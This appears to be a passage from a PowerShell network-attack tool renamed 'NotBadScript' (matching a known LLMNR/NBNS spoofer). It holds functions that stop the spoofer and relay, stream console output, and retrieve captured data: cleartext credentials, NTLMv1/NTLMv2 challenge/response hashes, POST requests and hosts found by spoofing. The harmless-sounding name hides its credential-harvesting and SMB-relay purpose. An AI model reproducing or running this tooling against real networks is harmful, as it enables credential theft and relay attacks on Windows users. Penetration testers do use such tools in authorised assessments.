                    "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $NotBadScript.log_out_file -Append
                }

                if($notbadscript.log_output)
                {
                    $notbadscript.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null
                }

            }

        }

        if($notbadscript.relay_running)
        {

            if($notbadscript.file_output)
            {
                "$(Get-Date -format 's') - NotBadScript Relay exited" | Out-File $NotBadScript.log_out_file -Append
            }

            if($notbadscript.log_output)
            {
                $notbadscript.log.Add("$(Get-Date -format 's') - NotBadScript Relay exited")  > $null
            }

            Write-Output("NotBadScript Relay exited at $(Get-Date -format 's')")
            $notbadscript.relay_running = $false

        }

        if($notbadscript.running)
        {

            if($notbadscript.file_output)
            {
                "$(Get-Date -format 's') - NotBadScript exited" | Out-File $NotBadScript.log_out_file -Append
            }

            if($notbadscript.log_output)
            {
                $notbadscript.log.Add("$(Get-Date -format 's') - NotBadScript exited")  > $null
            }

            Write-Output("NotBadScript exited at $(Get-Date -format 's')")
            $notbadscript.running = $false

        }

        $notbadscript.HTTPS = $false
        Start-Sleep -S 5
    }
    else
    {
        Write-Output("There are no running NotBadScript functions")
    }

}

}

function Get-NotBadScript
{
<#
.SYNOPSIS
Get-NotBadScript will get stored NotBadScript data from memory.

.PARAMETER Console
Get queued console output. This is also the default if no parameters are set.

.PARAMETER Learning
Get valid hosts discovered through spoofer learning.

.PARAMETER Log
Get log entries.

.PARAMETER Cleartext
Get captured cleartext credentials.

.PARAMETER CleartextUnique
Get unique captured cleartext credentials.

.PARAMETER NTLMv1
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv1Unique
Get the first captured NTLMv1 challenge/response for each unique account.

.PARAMETER NTLMv1Usernames
Get IP addresses and usernames for captured NTLMv2 challenge/response hashes.

.PARAMETER NTLMv2
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv2Unique
Get the first captured NTLMv2 challenge/response for each unique account.

.PARAMETER NTLMv2Usernames
Get IP addresses and usernames for captured NTLMv2 challenge/response hashes.

.PARAMETER POSTRequest
Get captured POST requests.

.PARAMETER POSTRequestUnique
Get unique captured POST request.
#>

[CmdletBinding()]
param
(
    [parameter(Mandatory=$false)][Switch]$Cleartext,
    [parameter(Mandatory=$false)][Switch]$CleartextUnique,
    [parameter(Mandatory=$false)][Switch]$Console,
    [parameter(Mandatory=$false)][Switch]$Learning,
    [parameter(Mandatory=$false)][Switch]$Log,
    [parameter(Mandatory=$false)][Switch]$NTLMv1,
    [parameter(Mandatory=$false)][Switch]$NTLMv2,
    [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,
    [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,
    [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,
    [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,
    [parameter(Mandatory=$false)][Switch]$POSTRequest,
    [parameter(Mandatory=$false)][Switch]$POSTRequestUnique,
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if($Console -or $PSBoundParameters.Count -eq 0)
{

    while($notbadscript.console_queue.Count -gt 0)
    {

        if($notbadscript.output_stream_only)
        {
            Write-Output($notbadscript.console_queue[0] + $notbadscript.newline)
            $notbadscript.console_queue.RemoveAt(0)
        }
        else
        {

            switch -wildcard ($notbadscript.console_queue[0])
            {

                {$_ -like "* written to *" -or $_ -like "* for relay *" -or $_ -like "*SMB relay *" -or $_ -like "* local administrator *"}
                {
                    Write-Warning $notbadscript.console_queue[0]
                    $notbadscript.console_queue.RemoveAt(0)
                }

                default
                {
                    Write-Output $notbadscript.console_queue[0]
                    $notbadscript.console_queue.RemoveAt(0)
                }

            }

        }

    }

}

if($Log)
{
    Write-Output $notbadscript.log
}

if($NTLMv1)
{
    Write-Output $notbadscript.NTLMv1_list
}

if($NTLMv1Unique)
{
    $notbadscript.NTLMv1_list.Sort()

    foreach($unique_NTLMv1 in $notbadscript.NTLMv1_list)
    {
        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
        {
            Write-Output $unique_NTLMv1
        }

        $unique_NTLMv1_account_last = $unique_NTLMv1_account
    }

}

if($NTLMv1Usernames)
{
    Write-Output $notbadscript.NTLMv2_username_list
}

if($NTLMv2)
{
    Write-Output $notbadscript.NTLMv2_list
}

if($NTLMv2Unique)
{
    $notbadscript.NTLMv2_list.Sort()

    foreach($unique_NTLMv2 in $notbadscript.NTLMv2_list)
    {
        $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
        {
            Write-Output $unique_NTLMv2
        }

        $unique_NTLMv2_account_last = $unique_NTLMv2_account
    }

}

if($NTLMv2Usernames)
{
    Write-Output $notbadscript.NTLMv2_username_list
}

if($Cleartext)
{
    Write-Output $notbadscript.cleartext_list
}

if($CleartextUnique)
{
    Write-Output $notbadscript.cleartext_list | Get-Unique
}

if($POSTRequest)
{
    Write-Output $notbadscript.POST_request_list
}

if($POSTRequestUnique)
{
    Write-Output $notbadscript.POST_request_list | Get-Unique
}

if($Learning)
{
    Write-Output $notbadscript.valid_host_list
}

}

function Watch-NotBadScript
{
<#
.SYNOPSIS
Watch-NotBadScript will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.

.PARAMETER ConsoleOutput
(Medium,Low) Medium and Low can be used to reduce output.
#>

[CmdletBinding()]
param
(
    [parameter(Mandatory=$false)][ValidateSet("Low","Medium")][String]$ConsoleOutput = "Y",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if($notbadscript.tool -ne 1)
{

    if($notbadscript.running -or $notbadscript.relay_running)
    {
        Write-Output "Press any key to stop real time console output"
        $notbadscript.console_output = $true

        :console_loop while((($notbadscript.running -or $notbadscript.relay_running) -and $notbadscript.console_output) -or ($notbadscript.console_queue.Count -gt 0 -and $notbadscript.console_output))
        {

            while($notbadscript.console_queue.Count -gt 0)
            {

                switch -wildcard ($notbadscript.console_queue[0])
                {

                    {$_ -like "* written to *" -or $_ -like "* for relay *" -or $_ -like "*SMB relay *" -or $_ -like "* local administrator *"}
                    {
                        Write-Warning $notbadscript.console_queue[0]
                        $notbadscript.console_queue.RemoveAt(0)
                    }

                    {$_ -like "* spoofer is disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {

                        if($ConsoleOutput -eq 'Y')
                        {
                            Write-Output $notbadscript.console_queue[0]
                        }

                        $notbadscript.console_queue.RemoveAt(0)

                    }

                    {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
                    {

                        if($ConsoleOutput -ne "Low")
                        {
                            Write-Output $notbadscript.console_queue[0]
                        }

                        $notbadscript.console_queue.RemoveAt(0)

                    }

                    default
                    {
                        Write-Output $notbadscript.console_queue[0]
                        $notbadscript.console_queue.RemoveAt(0)
                    }

                }

            }

            if([Console]::KeyAvailable)
            {
                $notbadscript.console_output = $false
                BREAK console_loop
            }

            Start-Sleep -m 5
        }

    }
    else
    {
        Write-Output "NotBadScript isn't running"
    }

}
else
{
    Write-Output "Watch-NotBadScript cannot be used with current external tool selection"
}

}

function Clear-NotBadScript
{

if($notbadscript)
{

    if(!$notbadscript.running -and !$notbadscript.relay_running)
    {
        Remove-Variable notbadscript -scope global
        Write-Output "NotBadScript data has been cleared from memory"
    }
    else
    {
        Write-Output "Run Stop-NotBadScript before running Clear-NotBadScript"
    }

}

}
